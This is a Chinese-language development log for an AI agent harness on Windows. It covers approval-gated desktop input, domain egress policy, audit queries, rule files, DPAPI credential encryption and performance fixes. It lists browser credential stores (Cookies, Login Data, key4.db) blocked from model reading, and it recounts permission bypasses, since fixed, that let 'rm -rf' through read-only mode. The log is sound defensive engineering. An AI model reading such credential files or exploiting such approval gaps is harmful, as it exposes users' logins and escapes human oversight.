`move/click/type/key/scroll` 及其参数，按动作白名单拒未知字段；单步模式禁带 `steps`）。一次
审批覆盖整组计划——审批卡逐行列出每步（`1.click(10,20) 2.type len=8 "…" 3.key=enter`）。
脚本逐步执行，每步前重读前台窗口（身份 + 敏感词），命中即中止，错误带 `step i/total` 与
`steps_done`；步间 50ms。序列超时 `min(60, 10 + 2×步数)`。审计记 `steps=N` 不记文本；工具
结果逐行列出已完成步骤。schema 枚举加 `sequence`，SHA1 更新为
`e2c3c02abb80f5741b00f3447b7d5dd5703cb855`。

真机验证（全部只读，未注入键鼠）：能力层直调 snapshot 成功（explorer 任务栏 pid=12000，
rect=(0,1368,2160,72)，无 U+FFFD，3298ms）；PowerShell `Parser::ParseInput` 静态校验整个
CONTROL_SCRIPT（含序列分支）PARSE_OK。定向 51 passed + ruff 通过；全量 **1937 passed /
2 skipped**。

### 键鼠流畅度第二轮：修饰键、右键/双击、wait（2026-10-26）

序列解决了“一次审批管一组”，但每一步仍只覆盖最基础形态：没有 `ctrl+v` 就做不了复制粘贴，
没有右键/双击就打不开上下文菜单和文件，序列里没有等待就等不及菜单动画。本轮补齐三项：

1. **修饰键组合**：`key` 接受 `+` 连接（`ctrl+v`、`ctrl+shift+s`、`alt+f4`、`win+d`）。Python
   侧拆段归一化（小写、去空白、最多 4 个修饰键、重复修饰键/空段/未知修饰键直接拒），
   PowerShell 侧按 ctrl=17/alt=18/shift=16/win=91 依次按下、敲基础 VK、再**逆序释放**，
   避免修饰键卡在按下状态。
2. **右键/双击**：`click` 新增 `button=left|right|middle` 与 `count=1|2`（双击间隔 40ms）。
   按下前停留 20ms，等菜单/提示条在光标下稳定。右/中键用 `mouse_event` 的
   0x0008/0x0010 与 0x0020/0x0040 事件对。
3. **等待步骤**：序列里可插入 `{action: wait, ms: 50..3000}`，仅序列可用（单步模式直接拒）。
   序列超时从 `10 + 2×步数` 改为 `10 + 2×步数 + wait 总秒数`，仍封顶 60s，避免等待被超时打断。

审批面同步：序列摘要显示 `right click(3,4)`、`double click(5,6)`、`wait 300ms`；单步 `click`
显示 `button=right, count=2`。schema 增加顶层 `button`/`count` 与 step 的 `button`/`count`/`ms`，
`key` 描述注明组合写法；SHA1 更新为 `dbad5aa01eff9ba25cc001500479a4334bd71cf3`。

验证：新增 18 条测试（组合归一化、13 个非法组合/点击/等待用例、wait 仅序列、超时覆盖 wait、
PowerShell 契约含 `$modMap`/`invalid_button`/`invalid_count`/`invalid_wait`、审批面渲染、
工具层透传 button/count）。`Parser::ParseInput` 静态解析整个 CONTROL_SCRIPT 为 PARSE_OK
（注意：用 `ParseFile` 读 UTF-8 无 BOM 文件会按 ANSI 解析，中文注释导致假报错；探针改为
`ReadAllText(..., UTF8)` + `ParseInput`）。定向 64 passed，全量 **1955 passed / 2 skipped**，
ruff 通过。真机只读冒烟：对当前前台窗口（Qoder）执行仅含一个 `wait` 步骤的序列，返回
`steps=({action:'wait', ok:True})`、1297ms，验证了步骤循环与 wait 分支的运行时路径；本轮
未注入任何真实键鼠输入，点击/组合键/滚轮仍按验收表由人执行。


## P4.2 落地：域名策略（allow / deny / 需审批）

动机：联网请求现在一律审批，日常噪音最大；但直接「联网免审」等于拆掉 exfiltration 边界。
这里只做「问不问」的分层，不放松「能不能」的校验。

- **`src/net_policy.py`（纯函数）**：匹配只有两种形态——精确主机，和 `*.example.com` 通配子域
  （**不含**根域本身，想同时放行要两条）。刻意不支持正则与 `*` 全匹配：一条写错的正则等于
  把出口全开。非 ASCII 主机不参与匹配（IDN 由网络层处理），宁可多问一次。
  `classify()` 里 **deny 先于 allow**：同时命中按拒绝处理。
- **`src/net_grants.py`（账本）**：`paths.cache_path('net_grants.json')`，`version: 1`，
  记录 `host` / `scope` / `expires` / `created_by` / `session_id` / `created_at`。
  写入走 `exclusive_file_lock` + 临时文件原子替换；读取不加锁。**损坏、未知版本、坏日期
  一律 fail-closed**（策略层看不到任何规则 = 回到逐个审批），而修改操作直接报错，
  不静默覆盖用户数据。坏记录逐条跳过并打印，不让一条脏数据废掉整个名单。
- **策略接入**：`exec_policy.Policy.evaluate` 新增 `net_rules`，只传给 `_evaluate_web`。
  URL 语法校验在最前，非法 URL 仍是 `invalid_url` 硬拒；随后 `deny` → `domain_denied`（硬拒），
  `allow` → `domain_allowed`，未命中维持 `network_egress` 询问。**allow 不绕过私网拦截**：
  那个校验在 `tool_exec.fetch_url` 的 `check_url` 里，发生在审批之前，名单不参与。
- **与档位的关系**：`deny` 与秘密文件同性质——`danger-full-access` + `never` 也绕不过；
  `allow` 只免除出口审批，不改变 `read-only` 档对其它操作的判定。
- **授权只能由人给**：飞书 `/domains [allow|deny|remove] <主机>` 与卡片撤销按钮
  （10 分钟 token、按聊天隔离）、`GET/POST /v1/net-grants` 与 `/v1/net-grants/remove`。
  模型工具面没有新增入口；`revoke_permissions` 只收回 `session_id` 等于当前会话的规则，
  人手动加的全局规则保留。审计写 `domain_added` / `domain_removed`。
- **可见性**：`/status` 显示「域名策略：允许 N · 拒绝 M」；卡片按 allow/deny 分色标注，
  空态直接告诉用户默认仍是逐个审批。
- **测试**：`tests/test_net_policy.py`（31）覆盖匹配边界（通配不含根域、后缀按点边界、
  非 ASCII 不匹配）、deny 优先、账本增删/过期/损坏/未知版本/坏记录隔离、会话级撤销、
  策略三态与档位交互；`tests/test_net_grants_api.py`（6）覆盖 API 增删、非法输入、
  审计事件、撤销语义与「名单真的改变判定」；`tests/test_feishu_domain_card.py`（7）
  覆盖命令、卡片、翻页、过期 token 与撤销。

未做：`bash` 里的 `curl`/`wget` 不受这份名单影响（那属于命令文本分析层，误伤面太大）；
没有「按路径/方法」的细粒度规则；没有规则的导入导出与全局审计检索（P6）。


## P6 落地：审计查询与飞书审计卡

目标：桌面控制、域名授权、目录授权上线后，「我批准过什么 / 它动过什么」必须能一句话查到。

- **`src/audit.py`（纯投影）**：只认 `AUDIT_EVENTS` 白名单，并把每个事件的字段裁到固定
  子集。这一层是脱敏的唯一位置——`desktop_action` 不返回键入文本，`screen_ocr` 不返回识别
  文字，`clipboard_*` 只给长度与截断标记。新增安全事件时在白名单登记一次即可，卡片不重复实现
  脱敏，避免两处口径分叉。
- **跨会话聚合**：按文件修改时间从新到旧扫 `session_*.jsonl`，命中 `since` 或条数上限就停止
  后续文件；损坏行逐条跳过，单文件读失败不影响其它会话。会话标题从 `session_title` 事件取。
- **`GET /v1/audit`**：`since`（epoch 或 ISO）、`limit`（默认 50、上限 200）、`types`
  （逗号分隔）、`session_id`。未知类型返回 400 而不是空列表——拼错时静默为空最容易误判
  “什么都没发生”。返回体附 `counts` 便于卡片标题。
- **飞书**：`/audit`、`/audit <类型>`、`/audit all`（列出可过滤类型）；卡片 8 条/页，
  按类型配图标，翻页 PATCH 同一张卡，按钮带 10 分钟 token。
- **测试**：`tests/test_audit.py`（11）覆盖白名单投影、字段裁剪、跨会话排序、类型/时间过滤、
  损坏行、标题、`since` 解析与 API 契约（含未知类型 400、无 token 401）；
  `tests/test_feishu_audit_card.py`（6）覆盖卡片渲染、空态、翻页与三条命令分支。

未做：OTel 导出；审计的导出/归档（目前只读最近 N 条）；`policy_denied` 事件尚未在所有
拒绝路径统一写入（策略层返回了 code，但只有部分入口落事件）。

## P4.2b 落地：用户规则文件

动机：命令审批的噪音集中在三类「静态判不准」的情况——破坏性词误伤（`npm test` 撞上
`npm`）、解释器与编码载荷、MCP 工具的未知副作用。每次都要人点一次，但真正想保留的
边界（秘密文件、域名、桌面控制）并不在这三类里。

- **`src/rules.py`**：YAML，`allow` / `ask` / `deny` 三态 + 命令**词前缀**匹配。
  `git status` 命中 `git status -s`，不命中 `git statusx` 也不命中 `echo git status`；
  多段命令要求每一段都命中（与 `approval_class` 的一致性判定同源）。作用域
  `session` / `global`。加载失败打印一行后按「无规则」处理，不影响启动。
- **关键取舍：白名单而不是黑名单。** `RULEABLE_CODES = {destructive,
  opaque_command, external_tool}`，只有这三类能被规则改写。以后新增任何决策码默认
  受保护，不会因为忘了加进保护名单被规则悄悄放宽。
- **两处实测出来的绕过，都已堵上：**
  1. 最初写成「黑名单 + 硬拒码」，`allow` 规则能改写 `sandbox_read_only` 的 ASK，
     `rm -rf` 在只读档被放行。改成白名单后不复存在。
  2. 即使有白名单，read-only 下 `rm -rf build` 会先命中 `destructive`（属于可改写
     类别），规则 allow 仍然绕过档位。因此 `apply()` 增加 `allow_permitted`，
     由 `hooks` 按当前档位传入：`read-only` 与 `untrusted` 档下 allow 不生效，
     deny 照旧生效（收窄永远是允许的方向）。
- 规则在 `hooks.evaluate_call` 的最后一步作用于策略结论：硬拒、URL 校验、路径分区、
  域名 deny 全部在它之前完成，规则只看得到最终 Decision。
- **入口**：`/rules`（CLI 与 TUI，TUI 侧补了 `CommandSpec` 以通过「CLI 命令必须在
  TUI 注册」的契约测试）；`/status` 显示「规则文件：允许 N · 询问 N · 拒绝 N」。
  模型没有写规则的入口。
- **测试**：`tests/test_rules.py`（35）覆盖前缀边界、多段一致性、deny 优先、
  白名单可改写集、`allow_permitted` 行为、作用域、损坏/非法内容、往返写回；
  `tests/test_rules_integration.py`（6）验证真实链路：allow 放开 destructive、
  read-only 档不被绕过、域名 deny 不被绕过、`/status` 三种状态。

未做：规则的增删命令（目前直接编辑 YAML）；规则命中的审计事件（`rule_allowed` 只
体现在 Decision 的 code 上，未落 `policy_denied` 类事件流）；没有 TTL/到期时间。

## P4.3 落地：自动放行的审计（不是改默认）

先核对现状：「把审查官升级成默认 reviewer」这件事**早就完成了**——`HARNESS_LLM_APPROVAL`
不设即启用，`0/false/off/no` 显式关闭；已有缓存、连续 3 次失败熔断、批级合并、独立超时
（`HARNESS_JUDGE_TIMEOUT`），只对 `destructive` / `opaque_command` / `network_egress`
三类询问生效，非交互线程不旁路，`/status` 有放行/升级/失败计数。

所以 P4.3 真正的缺口是**可审计**：放行只打印一行到控制台，事件流里什么都没有。
一旦出现「这条命令我没批准怎么执行了」，事后无从查起。

- 新增 `hooks._record_auto_approval`，两条自动放行路径统一留痕：
  - `by=llm-judge`：`enforce` 里审查官放行后；
  - `by=rule`：`evaluate_call` 返回 `rule_allowed` 时（规则文件 `allow`）。
- 事件 `approval_auto{tool, by, code, reason, command, args_keys}`：命令走
  `approval_view.summarize` 的口径（留头尾），参数只记键名不记值——审计要能回答
  「当时放行了什么」，但不该变成第二份完整历史。
- 失败处理一律静默：无活动会话、会话文件不存在、写入抛错都只打印，**不改变**已经
  发生的放行结果。观察层不能反向影响执行。
- `audit.AUDIT_EVENTS` 与审计卡收录该类型（`🤖`），卡片摘要显示 `by · tool · reason`。
- 测试：`tests/test_auto_approval_audit.py`（6）覆盖规则放行的审计内容、参数不落值、
  审计写入失败不影响放行、无会话不写、普通 ALLOW 不写、`/v1/audit` 可查。

未做：审查官判定所用的模型名没有进事件（只记 `by`）；`approval_auto` 没有单独的
限流/聚合视图，量大时需要按 `types` 过滤查看。

## C1 落地：凭据静态加密（DPAPI）

`.env` 是明文，任何能读它的东西（别的进程、备份同步、误提交、截图）都能拿到飞书
secret 与 API token。`checkpoints.DEFAULT_SECRETS` 只挡住「模型主动读」，不改变
文件本身的形态。

- **`src/credentials.py`**：Windows DPAPI（`win32crypt.CryptProtectData` + 额外熵
  绑定本应用）加密 `LLM_API_KEY` / `HARNESS_API_TOKEN` / `FEISHU_APP_SECRET`，
  存 `.cache/credentials.bin`（前缀 `HARNESS1` 便于识别格式）。密文绑定当前用户，
  换用户或换机器解不开——这是特性不是缺陷。非 Windows 直接不可用，不做自研加密。
- **加载顺序：密文优先，`.env` 兜底。** `harness.py` 在 `load_dotenv()` 之后调用
  `_apply_secure_credentials()`，飞书网关与 `agent_service.py` 各自也接了一次
  （它们是独立入口，不经过 harness）。任何失败都降级为空操作：缺 pywin32、文件
  损坏、解密失败都只打印一行，启动不依赖这一步。
- **只做密文副本，不改 `.env`。** 迁移是显式动作：`scripts/secure_credentials.py`
  的 `status/migrate/rotate/clear`。`migrate` 默认**不删** `.env` 的行；
  `--delete-env-secrets` 才删，且只删这三个键、保留注释与其它行（按行解析，
  不重写整个文件）。
- **合并而非覆盖**：已加密过一部分键时再 `migrate` 会把旧密文读出来合并，不会
  因为这次 `.env` 里只有一项就丢掉上一份。
- **可观测**：`/status` 与 `--doctor` 显示「凭据：加密文件（N 项）」/「明文 .env
  （未迁移）」，并列出 `.env` 里仍存在的明文键——避免「以为加密了其实在跑明文」。
  `HARNESS_DISABLE_SECURE_CREDENTIALS=1` 可临时忽略密文排障。
- **测试**：`tests/test_credentials.py`（16）覆盖 DPAPI 往返、密文不含明文、
  只保留已知键、损坏/未知格式、密文优先于环境变量、损坏时降级且 `.env` 仍生效、
  指纹稳定、迁移脚本的四种模式（含只删指定行、无内容时退出码 2、与旧密文合并、
  `clear` 幂等、`status` 报告明文残留）。

**边界**：这是静态数据保护，不是运行时隔离。进程内存仍是明文，同用户权限的调试器
或恶意进程照样能读到。DPAPI 绑定当前用户，换机器后必须用原 `.env` 重新加密。


## P5 落地：浏览器通过 MCP 接入 + 凭据保护补齐

浏览器不进内核：项目已有 MCP 桥（`src/mcp_bridge.py`，`MCP_SERVERS_FILE` 配置），
把 Playwright/Puppeteer 当作可替换的外部 server 接入即可，不新增执行路径。

本轮补的是三件真正缺的东西：

1. **浏览器凭据不再可读**。`Cookies`、`Cookies-journal`、`Login Data`、
   `Web Data`、`Local State`、`key4.db`、`logins.json`、`cookies.sqlite` 加入
   `checkpoints.DEFAULT_SECRETS`。这是真实缺口：浏览器 profile 通常在工作区之外，
   而读策略对工作区外是**放开**的，`read`/`grep` 原本可以整库读走登录态。
   刻意只挡这几份库——`History`/`Bookmarks`/`Preferences` 照常可读，否则正常排障
   无从下手。
2. **独立 profile 目录**（`src/browser_profile.py`）：`<home>/.cache/browser-profile`，
   `HARNESS_BROWSER_PROFILE` 可覆盖。放 `.cache` 下顺带获得 `DEFAULT_IGNORE` 保护
   （检索工具默认跳过），POSIX 权限 0700。指到日常 Chrome/Edge 目录时
   `describe()` 与 `/status` 明确标 ⚠——那种配置会和已开着的浏览器抢 profile，
   也会让「撤销 agent 登录」变成清理日常浏览器。
3. **配置助手**（`scripts/browser_setup.py`）：`snippet` 生成两种配置
   （`--isolated` 临时 / `--user-data-dir` 复用登录），`check` 检查现有配置。
   `_looks_like_browser` 按 name/command/args 三处识别，因为用户常把 server
   命名成 `pw`——只看 name 会让「没写 profile 参数」的警告失效。

审批语义不变：MCP 工具登记为第三方工具，三种档位下都默认审批，`never` 下
fail-closed。登录/支付/2FA/改密码仍是使用约定（不做自动登录工具），模型看不到
密码是设计目标。

测试：`tests/test_browser_credentials.py`（19）验证秘密文件命中与读/检索硬拒、
普通浏览器文件不被误挡、大小写与 `classify_path` 分区；
`tests/test_browser_profile.py`（11，1 skip 因 Windows 无 POSIX 权限位）；
`tests/test_browser_setup.py`（11）覆盖两种 snippet、四类 check 分支与标记识别。

未做：不安装 `@playwright/mcp`（只生成配置）；浏览器 server 的生命周期不由 agent
管理；没有「页面截图回传飞书」的内置链路。

## 性能 profile：对话速度与内存（2026-10-26）

用项目自带的三把尺子实测，不猜：`scripts/profile_conversation.py`（真实 usage 事件，
768 次调用 / 56 会话）、`scripts/profile_turn_pipeline.py`（本地管线分段计时）、
`scripts/profile_storage.py`（磁盘占用）。

### 对话速度：本地不是瓶颈

| 阶段 | p50 | p95 |
|---|---|---|
| prepare（重建历史 + 组装） | 1.46 ms | 6.5 ms |
| prompt 组装 | 1.35 ms | 5.2 ms |
| compact 决策 | 0.08 ms | 1.9 ms |
| **模型请求（含首字）** | **1969 ms** | **6485 ms** |
| 工具批次 | 216 ms | 7984 ms |

本地处理合计约 2–3 ms，占端到端 <0.2%。**对话慢几乎完全取决于 provider**，
优化本地代码对体感没有帮助。这条结论避免了在没有收益的地方动刀。

最长的会话（239 消息 / 4.9MB）稳态 9.55 ms，783 消息的会话 23.75 ms——历史重建
是线性的但底数极小。

### 找到一个真实的缓存浪费（已修）

加权缓存命中率 89.4%，看起来还行，但拆开看分布很不均：

| 分组 | 调用数 | 加权命中率 | 未命中 token |
|---|---|---|---|
| 全部 | 768 | 0.894 | 3,811,988 |
| **snip 后 12 个事件内** | **45** | **0.454** | **2,205,841** |
| 其余 | 723 | 0.950 | 1,606,147 |

**6% 的调用吃掉了 58% 的未命中 token。** 根因：`snip_compact` 写进历史中间的
marker 是 `[snipped N messages]`，N = 本次截掉的消息数，**每轮都不同**。它落在
前缀中间，文本一变，marker 之后整个尾部全部失配——实测同一会话里紧邻的两次调用
命中率可以是 0.97 和 0.26。

修复：marker 改成常量 `SNIP_MARKER = '[earlier messages were trimmed]'`
（`src/compaction.py`），`session_store` 的两处还原分支（索引版与旧版 head/tail
副本）都用同一常量。代价是模型看不到「截掉多少条」——但那个数字每轮都在变，
本来也读不出含义；判断「有没有丢上下文」看的是标记存在与否。

复现方式（修复前 `snipped` 序列）：`4 → 3 → 113 → 3 → 3 → 186`，每个值都不同。

新增测试 `test_snip_marker_is_byte_stable_across_rounds` 锁住「不同截断量 → 同一段
文本」这个不变量；改动的 4 个既有测试同步更新断言。

### 内存：本地无泄漏，磁盘有一处无上限增长

- **进程内无泄漏**：对最大会话连续 60 次 `rebuild_openai_history`，tracemalloc
  增长 **−0.03 MB**；20 轮完整管线增长 **+0.001 MB**。峰值 2.98 MB。
  事件缓存本来就有 `HARNESS_EVENT_CACHE_MAX_BYTES`（默认 2MB）兜底。
- 观测到的网关私有内存 175MB / 工作集 20MB 属于长跑进程的正常工作集与配额差异，
  不是随轮次增长的泄漏——上面两条测量排除了这条嫌疑。
- **真实问题：API 访问日志无轮转**。`.cache/api/api-access.log` 单文件
  **17.8 MB / 14.3 万行**，且全是重复的轮询请求。用的是普通 `FileHandler`，
  长期常驻会一直涨。改为 `RotatingFileHandler`（默认 10MB × 3 份），
  可用 `HARNESS_API_LOG_MAX_BYTES` / `HARNESS_API_LOG_BACKUPS` 调整
  （最小值 64KB 防碎片，份数上限 20）。新增 `tests/test_api_log_rotation.py`
  （14 条）覆盖参数解析、真实轮转与「create_app 装配的是轮转版」。
- 磁盘其它项都在健康范围：会话 9.4MB/56 文件、checkpoint 37.2MB（可 `/checkpoint-gc`
  回收 2.4MB）、截图 978KB（7 天自动清理）。

### 没动的部分

`memory_load_ms` p95 = 376ms 但只有 21 次采样，且是首次加载嵌入索引的一次性成本；
把它做成常驻会引入新的状态，收益不确定，先记录不动。

## 体验打磨：让新能力在手机上找得到

新加的 `/domains`、`/rules`、`/audit` 只有在本轮会话里才知道怎么用——手机上没人会
翻文档。两处补齐，顺带修了帮助文本的重复项。

- **`_help_text` 重排**：原来 `/resume`、`/perms` 各出现两次（旧内容以追加方式堆叠
  导致的重复）；现在按「会话 / 工作区 / 清理 / 权限与安全 / 任务」分组，并把三个新
  命令放进「权限与安全」。保留「可用命令」与 `/use` 两个字符串：既有测试与用户习惯
  都依赖它们。
- **控制台卡片加两个入口**：「域名策略」「审计」按钮，与既有「定时任务」「目录授权」
  同排。控制台是手机上的第一入口，按键直达比记命令现实。
  摘要行也加了域名计数（`域名 允许N/拒绝M`），一眼能看到当前有哪些放开的外发边界。
- **面板动作接线**：`_handle_panel_action` 新增 `domains` / `audit` / `rules` 三个
  分支。域名计数取不到时用 `None`（卡片降级为不显示该项）——控制台不能因为新接口
  抖动就打不开，这与既有 crons/grants 的容错口径一致。

测试：新增 4 条（控制台含域名/审计入口、三个面板动作各自打开对应卡片）。
全量 2142 passed / 3 skipped，ruff 通过。

未做：TUI 侧的 `/domains`、`/audit` 还没有对应命令（只有 `/rules`）；这两条目前
只走飞书与 HTTP API。
## 新增功能的真实 profile 与提速（2026-10-26）

用户反馈「调用要快、不能一步一请求」。之前只测过对话管线，新增的桌面/剪贴板/审计
没测过，这一轮全部走真实实现（`scripts/profile_new_tools.py`，不打桩、只做只读操作）。

### 结论：瓶颈 100% 在「每次起一个 PowerShell 进程」

| 操作 | 修复前 p50 | 修复后 p50 | 倍数 |
|---|---|---|---|
| `desktop_snapshot` | 963 ms | **15.1 ms** | 64× |
| `clipboard_read` | 891 ms | **1.4 ms** | 620× |
| 5 步桌面序列 | 2234 ms | **862 ms** | 2.6× |
| `audit.collect`（56 会话） | 282 ms | **44 ms** | 6.4× |

进程启动本身的分解（空脚本实测）：启动 263 ms，`Add-Type -AssemblyName` 再加 113 ms，
首次 `Add-Type -TypeDefinition` 编译 C# 到 1.6–2.2 s。也就是说**每次调用都在重复付
这些固定成本**，而真正的工作只要几毫秒。

### 修法一：常驻 PowerShell worker（`src/ps_worker.py`）

一个常驻进程，stdin 喂一行 JSON 请求、stdout 读一行 JSON 响应，`Add-Type` 只在启动
时做一次。实测协议往返 **1.2 ms**。

设计上刻意保守，因为这里出错等于「工具全挂」：

- 一行一请求、一行一响应，不用长度前缀——PowerShell 侧 `ReadLine` 最不容易写错；
- 任何未捕获异常都转成 `{"ok": false}` 且**不让进程退出**，一个坏请求不能拖死后面全部；
- 超时的 worker 直接丢弃（否则下次会读到上一条的响应），下次调用自动重启；
- 连续失败 3 次熔断，退回「每次起进程」的老路径（`HARNESS_PS_WORKER=0` 可强制关闭，
  `HARNESS_PS_WORKER_FALLBACK=0` 可禁用降级以便暴露问题）；
- 每进程单例 + 加锁串行：桌面控制是单用户交互场景，串行不会成为瓶颈，而并发写同一个
  stdin 一定会把协议搞乱。

接入：`desktop_control_windows` 与 `clipboard_windows` 都改成「先试 worker，失败降级」。
`screen_capture` 暂未接入——它 1.6 s 里主要是 PNG 编码和落盘，进程开销只占小头，
收益不足以承担改脚本的风险。

### 改造中实测出来的 5 个 bug（都是 worker 模式才暴露的）

这些在「每次起进程」模式下被 `exit` 掩盖，改成常驻后才现形：

1. **`snapshot` 分支写完不回包**：`Write-Result` 在独立模式里带 `exit`，worker 模式下
   函数继续往下走到动作分支，一次成功的快照变成 `foreground_changed`。
   → 改成只 `return` 对象，由顶层循环统一回包。
2. **`Fail` 改成返回失败对象后调用点继续执行**：一个请求回两次包，之后每个请求都读到
   上一条的答复（协议整体错位）。→ 用 `$script:HarnessFailure` + 哨兵异常把控制权
   交给顶层 catch。
3. **`OrderedDictionary` 没有 `ContainsKey`**：`ps_worker` 的循环用它补 `ok` 字段，
   每次都抛「找不到方法」。→ 改用键索引判断。
4. **stdout 未 flush**：去掉 `exit` 后独立进程模式写不完就退出，读到空串。
   → 显式 `Flush()`。
5. **`$pid` 撞只读自动变量**（上一轮已修，这里复述）：`$pid = ...` 在
   `$ErrorActionPreference='Stop'` 下必抛，改名 `$procId`。

第 1、2 条只有「跑第二次请求」才会暴露——单请求测试永远绿。因此
`tests/test_ps_worker.py` 特意覆盖连续多请求、异常后继续、超时后重启这三种时序。

### 修法二：审计查询加两道路径优化

`audit.collect` 原本对每个会话文件全量 `json.loads`：56 个会话 7550 条事件要 235 ms。

1. **子串预筛**：只把可能含审计事件的行交给 json 解析。关键是按 **JSON 字段形态**
   匹配（正则 `"type"\s*:\s*"(grant_added|...)"`），而不是裸名字——会话里到处是消息
   正文，裸子串的精确率只有 24%，白付解析成本。改后精确率 **23/23 = 100%**。
2. **文件预算**：按修改时间从新到旧扫，默认最多看 64 个会话，攒够 `limit` 就停。

合计 282 ms → **44 ms**。

### 目前的延迟基线

| 项 | p50 | 说明 |
|---|---|---|
| `desktop_snapshot` | 15 ms | 含 UIA 焦点查询（跨进程，占大头） |
| `clipboard_read` | 1.4 ms | |
| 策略判定（bash/web_fetch/desktop） | 3.5–4.0 ms | 含规则/域名账本读盘 |
| `audit.collect` | 44–79 ms | 按需查询，不在回合热路径 |
| 截屏 | ~1600 ms | 主要是 PNG 编码 + 落盘，非进程开销 |

策略判定 3.5 ms 里主要是每次重新读 `rules.yaml` 与 `net_grants.json`。这个量级可以接受
（一次回合通常 1–3 次工具调用），加缓存会引入「改了文件不生效」的新问题，**刻意不加**。

### 未做

- `screen_capture` 未接入 worker（见上）。
- 策略账本没有内存缓存（理由见上）。
- `desktop_snapshot` 的 UIA 查询仍是每步都做：这是「每步重新校验前台窗口」的安全要求，
  去掉它会让序列在窗口切换后继续盲打，属于用安全换速度，不做。
## 功能可用性 profile（2026-10-26，第二轮）

上一轮只看速度，这一轮按「真实会怎么用」逐项跑一遍，找「能跑但不好用」的地方。
共修 6 处，其中 3 处是会让用户以为功能坏了的缺陷。

### 修掉的可用性缺陷

**1. 序列失败时模型看不到可指导的信息**（`src/ps_worker.py` + `desktop_control_windows.py`）

worker 回包是 `{ok:false, error:'out_of_window', message:'step 2/3 (click): coordinates...'}`
这样带定位信息的结构，但 `run()` 只把 `error` 代码抛出去，工具层于是显示：

    Error: desktop action failed: unexpected desktop control output:

模型既不知道第几步失败，也不知道为什么。更糟的是这个错误被当成「worker 故障」触发了
降级，独立进程重跑一次得到同样结果，可读信息全被换成 `unexpected output`。

两头都修：`_failure_text()` 把 `error` 与 `message` 拼起来；`_is_worker_failure()`
按关键字区分「worker 真不可用」与「请求被正确拒绝」，后者不再降级。
现在模型看到 `out_of_window: step 2/2 (click): coordinates are outside the target window`。

**2. `*.com` 能通过校验，等于放开整个顶级域**

`normalize_pattern('*.com')` 原本返回 `*.com`，匹配**任意** `.com` 域名。写规则的人
通常想放行某个站点的子域，一次手滑就把出口全开了。现在只覆盖一个标签的通配直接拒绝，
并提示改用具体域名。`*.co.uk` 这类多标签的仍然允许。

**3. 粘完整 URL 被拒，且不说怎么改**

`/domains allow https://docs.example.com/a?x=1` 是最自然的输入，原来报
「host must not contain scheme, port, path or spaces」——让用户自己拆，而拆错
（留下 `/a`）会更难查。新增 `strip_url_noise()`：去协议、路径、查询、片段、端口，
`*.` 前缀保留。还原后仍受通配与 TLD 规则约束（`https://*.com/x` 照样拒）。

**4. 规则不认绝对路径调用，与策略层语义不一致**

策略层判破坏性词时先对 `/usr/bin/git` 做 basename 归一，但规则层用的是原文前缀匹配。
结果：用户写了 `git status` 规则，`/usr/bin/git status` 仍然被问一次——看起来像规则没生效。
`_prefix_match` 现在同时试原文与 basename 归一后的形式，且不放宽词边界
（`/usr/bin/git log`、`/usr/bin/git statusx` 仍不命中）。

**5. 审计截断时不说「还有更多」**

服务端按 `limit` 截断，卡片只说「共 50 条」。用户会以为这就是全部。`audit_card` 新增
`truncated` 参数，达到上限时补一句「已达显示上限，更早的事件请用 /audit <类型> 缩小范围」。

**6. 自动放行的 reason 文案重复**

审计事件里是 `allowed by rule: allowed by rule (npm test)`——`explain()` 与 `apply()`
各加了一次前缀。现在 reason 只保留规则本身（命中的前缀或用户写的 note），前缀由
`apply()` 统一加。

### 顺手做掉的一处性能优化

`evaluate_call` 3.5ms 里 **60% 是每次重新 YAML 解析**（profiler：50 次判定 127ms，
其中 75ms 在 `yaml.safe_load`）。`rules.load()` 加 `(路径, mtime_ns, size)` 缓存：
文件一改立刻失效，不会出现「改了规则不生效」——那正是常驻缓存最容易被诟病的地方。
实测 **3.5ms → 0.42–0.65ms**，改文件后下一次判定立即生效（有测试覆盖）。

### 优化后的延迟基线

| 项 | p50 | 对比 |
|---|---|---|
| `desktop_snapshot` | 16.7 ms | 独立进程 913 ms |
| `clipboard_read` | 1.9 ms | 独立进程 403 ms |
| `evaluate_call`（bash / web_fetch / desktop） | 0.44–0.65 ms | 原 3.5–4.0 ms |
| `audit.collect`（56 会话） | 62 ms | 原 282 ms |

### 确认没问题的部分

按真实输入逐项验过、**不需要改**的：

- 桌面动作的参数校验 8 类（缺坐标、超长文本、无效键、scroll=0、空序列、超 12 步、
  未知动作、单步带 steps）都给出明确拒绝文案；
- 域名匹配语义：`*.example.com` 匹配多层子域但不含根域，大小写与末尾点归一，非 ASCII 不匹配；
- 审计卡片渲染、跨会话聚合、类型过滤、损坏行跳过；
- 规则三态与 `allow_permitted`（read-only/untrusted 下 allow 不生效）的边界。

测试：`test_rules` 38（+3 绝对路径）、`test_net_policy` 40（+9 URL 还原与 TLD 护栏）、
`test_net_grants_api` 7（+1 URL 还原）、`test_feishu_audit_card` 7（+1 截断提示）。
全量 2166 passed / 3 skipped，ruff 通过。

### 未做

- `screen_capture` 仍未接 worker（1.6s 里主要是 PNG 编码，进程开销占小头）。
- 审计没有建持久索引：62ms 对按需查询够用，建索引会引入一致性维护成本。
- `desktop_snapshot` 每步仍查 UIA：这是「每步重新校验前台窗口」的安全要求。
## 组合工作流验证：列窗口 → 切窗 → 快照 → 序列（2026-10-26）

之前每个工具单独验过，但没验过串起来用。这轮按「模型真会怎么调」跑完整链路，
重点看耗时与流畅度。

### 修掉的三处真实瓶颈

**1. 首次列窗口 3.7 秒——worker 冷启动**

`desktop_windows` 第一次调用要 3.1–3.7 s。分解后确认不是 EnumWindows 慢，而是
**PowerShell worker 启动本身 2.7 s**（`Add-Type -AssemblyName UIAutomation*` +
C# 编译）。这笔成本只取决于程序集与脚本，和具体请求无关。

修法：`ps_worker.start_warmup()`，在 API 启动时（与 MCP 初始化同处）后台把
desktop / clipboard 两个 worker 拉起来。用户读完界面第一次点按钮时已经就绪。
实测首次列窗口 **3077 ms → 300 ms**。`HARNESS_PS_WARMUP=0` 可关闭。

**2. 列窗口 174ms——每个窗口查一次进程名**

`GetProcesses()` 全表预取改成一次性，取代每窗口一次 `Get-Process -Id`。
20 个窗口时那是 20 次跨进程查询。实测 **174 ms → 48 ms**。

**3. 切窗 160ms——固定 sleep 120ms**

原来切完固定 `Start-Sleep 120ms` 等窗口动画。改成轮询前台是否已经变了，
上限 300ms。实测 **160 ms → 32 ms**（多数切换 10–30ms 就到位）。

### 切窗的硬限制：Windows 前台锁

`SetForegroundWindow` 对后台进程有前台锁，实测**约一半调用会被拒**。这是系统
行为，不是 bug。补了 `AttachThreadInput` + `BringWindowToTop` 的常规绕过手段，
